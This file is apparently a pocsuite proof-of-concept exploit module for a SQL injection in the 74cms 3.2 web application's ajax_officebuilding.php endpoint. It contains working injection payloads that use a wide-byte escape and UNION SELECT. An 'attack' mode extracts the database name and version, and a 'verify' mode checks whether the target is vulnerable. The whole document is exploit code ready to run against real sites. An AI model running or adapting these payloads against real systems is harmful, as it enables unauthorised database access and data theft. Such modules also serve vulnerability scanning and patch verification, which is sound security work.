#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = '74cms 3.2 ajax_officebuilding.php sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=63225']
    desc = '''74cms 3.2  ajax_officebuilding.php sql injection'''

    vulDate = '2014-09-03'
    createDate = '2019-03-29'
    updateDate = '2019-03-29'

    appName = '74cms'
    appVersion = '3.2'
    appPowerLink = 'http://www.74cms.com'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/plus/ajax_officebuilding.php"
        payload1 = "?act=key&key=asd%E9%8C%A6%27 /*!50000union*/ /*!50000select*/ 1,2,3,concat(0x7e,database(),0x7e),5,6,7,version(),9%23"
        url1 = self.url + payload1
        resp1 = s.get(url1)
        dbname1 = re.search('~(.*?)~', resp1.content)
        if dbname1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname1.group(1)
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/plus/ajax_officebuilding.php"
        payload1 = "?act=key&key=asd%E9%8C%A6%27 /*!50000union*/ /*!50000select*/ 1,2,3,md5(1),5,6,7,version(),9%23"
        url1 = self.url + payload1
        resp1 = s.get(url1)
        time.sleep(2)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp1.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

